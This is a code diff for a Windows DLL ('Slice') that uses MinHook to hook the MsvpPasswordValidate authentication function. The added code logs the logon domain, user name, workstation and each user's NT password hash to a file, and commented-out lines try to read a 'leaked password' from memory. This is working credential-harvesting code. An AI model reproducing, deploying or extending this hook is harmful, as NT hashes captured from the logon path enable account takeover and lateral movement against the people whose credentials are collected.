@@ -21,6 +21,25 @@ void write_to_log(const char* format, ...)
 	fclose(logfile);
 }
 
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _OLD_LARGE_INTEGER {
+	unsigned long LowPart;
+	long HighPart;
+} OLD_LARGE_INTEGER, *POLD_LARGE_INTEGER;
+
+typedef struct _NETLOGON_LOGON_IDENTITY_INFO {
+	UNICODE_STRING    LogonDomainName;
+	ULONG             ParameterControl;
+	OLD_LARGE_INTEGER LogonId;
+	UNICODE_STRING    UserName;
+	UNICODE_STRING    Workstation;
+} NETLOGON_LOGON_IDENTITY_INFO, *PNETLOGON_LOGON_IDENTITY_INFO;
+
 // global function pointer
 void* g_MsvpPasswordValidate = NULL;
 
@@ -30,20 +49,29 @@ static BOOLEAN MsvpPasswordValidate(BOOLEAN UasCompatibilityRequired,
 	PVOID Passwords, //PUSER_INTERNAL1_INFORMATION Passwords,
 	PULONG UserFlags,
 	PUSER_SESSION_KEY UserSessionKey,
-	PVOID LmSessionKey
-)
+	PVOID LmSessionKey)
 {
 	//printf("[?] Called MsvpPasswordValidate...\n");
 	write_to_log("[?] Called MsvpPasswordValidate...\n");
 	write_to_log("\tUasCompatibilityRequired : 0x%x\n", UasCompatibilityRequired);
 	write_to_log("\tLogonLevel               : 0x%x\n", LogonLevel);
-	write_to_log("\tLoginInformation         : TODO\n");
+
+	write_to_log("\tLoginInformation\n");
+	PNETLOGON_LOGON_IDENTITY_INFO test = (PNETLOGON_LOGON_IDENTITY_INFO)LogonInformation;
+	write_to_log("\t\tLogonDomainName  : %.*S\n", test->LogonDomainName.Length, test->LogonDomainName.Buffer);
+	write_to_log("\t\tUserName         : %.*S\n", test->UserName.Length/sizeof(wchar_t), test->UserName.Buffer);
+	write_to_log("\t\tWorkstation      : %.*S\n", test->Workstation.Length, test->Workstation.Buffer);
+
 	write_to_log("\tPasswords\n");
 	unsigned char* temp = (unsigned char*)Passwords;
-	write_to_log("\t\tNTHash              : %.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x\n",
+	write_to_log("\t\tNTHash    : %.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x\n",
 		temp[0], temp[1], temp[2], temp[3], temp[4], temp[5], temp[6],
 		temp[7], temp[8], temp[9], temp[10], temp[11], temp[12], temp[13],
 		temp[14], temp[15]);
+
+	//write_to_log("\tLeaked password\n");
+	//testRawData(((unsigned char*)test->UserName.Buffer) + test->UserName.Length, 64);
+	//write_to_log("\t\t%.*S\n", 64, ((unsigned char*)test->UserName.Buffer) + test->UserName.Length);
 
 	return ((FnMsvpPasswordValidate)g_MsvpPasswordValidate)(
 		UasCompatibilityRequired,
@@ -55,11 +83,6 @@ static BOOLEAN MsvpPasswordValidate(BOOLEAN UasCompatibilityRequired,
 		LmSessionKey
 		);
 };
-
-static void testdetour(int n) {
-	DbgFprintf(outlogfile, PRINT_INFO1, "Inside hooked function\n");
-	((FnTestF)(n));
-}
 
 Slice::Slice()
 {
@@ -74,7 +97,6 @@ void Slice::start()
 	MH_Initialize();
 
 	hookfunc();
-	//testhook();
 }
 
 void Slice::stop()
@@ -102,24 +124,6 @@ void Slice::hookfunc()
 		DbgFprintf(outlogfile, PRINT_ERROR, "GetProcAddress error 0x%x, %d\n", GetLastError(), GetLastError());
 		return;
 	}
-	DbgFprintf(outlogfile, PRINT_INFO1, "MsvpPasswordValidate  - 0x%llx\n", pMsvpPasswordValidate);
-
-	MH_STATUS status = MH_CreateHook(pMsvpPasswordValidate, MsvpPasswordValidate, &g_MsvpPasswordValidate);
-	if (status != MH_OK) {
-		DbgFprintf(outlogfile, PRINT_ERROR, "MH_CreateHook error %d\n", status);
-		return;
-	}
-
-	status = MH_EnableHook(MH_ALL_HOOKS);
-	if (status != MH_OK) {
-		DbgFprintf(outlogfile, PRINT_ERROR, "MH_EnableHook error %d\n", status);
-		return;
-	}
-}
-
-void Slice::testhook()
-{
-	pMsvpPasswordValidate = (void*)0x00007FF6260F4071;
 	DbgFprintf(outlogfile, PRINT_INFO1, "MsvpPasswordValidate  - 0x%llx\n", pMsvpPasswordValidate);
 
 	MH_STATUS status = MH_CreateHook(pMsvpPasswordValidate, MsvpPasswordValidate, &g_MsvpPasswordValidate);
